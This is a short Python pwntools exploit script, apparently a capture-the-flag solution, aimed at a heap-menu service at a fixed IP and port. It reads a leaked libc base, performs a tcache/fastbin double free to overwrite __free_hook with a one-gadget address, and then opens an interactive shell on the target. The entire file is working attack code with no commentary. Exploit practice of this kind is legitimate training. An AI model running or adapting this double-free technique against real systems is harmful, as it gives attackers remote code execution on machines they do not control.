from pwn import *

libc = context.binary = ELF(args.EXE or './libc.so.6')


p = remote('10.21.232.3',20202)

p.recvuntil(b'Libc base: ')
libc_base_address = p.recvuntil(b'\n') 
libc_base_address = int(libc_base_address.decode(),16)



free_hook_address = libc_base_address + libc.symbols['__free_hook']

def remove(user: int):
    p.sendline(b'd')
    p.sendline(str(user).encode())

def add(name : bytes):
    p.sendline(b'g\n'+name)
    

def quit():
    p.sendline(b'x')

write_addr = free_hook_address
#libc.got.free

bin_sh = libc_base_address + 0x4f302
done = "x\n"


for i in range(9):
    add(b'abcdef')

for i in range(7):
    remove(i)

remove(7)

remove(8)

remove(7)


for i in range(7):
    add(b'abcdef')
    

add(pack(write_addr))
add(b'abcdef')
add(b'abcdef')
add(pack(bin_sh))
remove(0)
p.sendline(b'x')

p.interactive()


